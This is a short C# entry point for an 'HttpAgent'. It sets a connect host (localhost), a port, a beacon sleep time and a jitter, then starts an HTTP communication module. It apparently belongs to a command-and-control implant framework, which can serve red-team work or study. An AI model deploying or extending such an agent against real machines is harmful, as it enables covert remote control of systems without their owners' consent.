using System;
using AgentCore.Controllers;
using AgentCore.Models;
using HttpAgent.Modules;

namespace HttpAgent
{
    class Program
    {
        static void Main(string[] args)
        {
            var config = new ConfigController();
            config.SetOption(ConfigSetting.ConnectHost, "127.0.0.1");
            config.SetOption(ConfigSetting.ConnectPort, 8000);
            config.SetOption(ConfigSetting.SleepTime, 1);
            config.SetOption(ConfigSetting.Jitter, 0);

            var commModule = new HttpCommModule();
            commModule.Init(config);
            commModule.Run();
        }
    }
}
